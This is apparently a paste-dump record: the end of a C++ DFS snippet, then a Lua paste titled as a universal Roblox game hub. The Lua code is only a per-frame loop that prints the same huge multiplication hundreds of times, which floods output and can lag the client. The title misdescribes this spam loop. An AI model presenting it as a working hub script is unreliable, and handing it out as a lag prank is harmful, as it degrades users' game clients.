        dfs(root->left,sum-root->val);
        dfs(root->right,sum-root->val);
    }
};"
uxgECx0J,universial hub games all game,Maks14a,Lua,Friday 10th of May 2024 06:36:32 AM CDT,"while game:GetService(""RunService"").RenderStepped:wait() do
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
